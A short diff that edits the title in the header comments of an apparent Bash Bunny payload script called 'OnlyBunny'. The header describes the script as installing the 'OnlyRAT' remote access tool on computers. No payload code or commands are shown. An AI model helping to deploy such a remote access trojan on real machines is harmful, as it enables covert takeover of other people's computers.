@@ -1,4 +1,4 @@
-# Title: 		OnlyBunny 
+# Title: 		OnlyBunny [FROM GITHUB]
 # Description:	Installs OnlyRAT on computers
 # Author:		Blue Cosmo
 # Category:		remote access
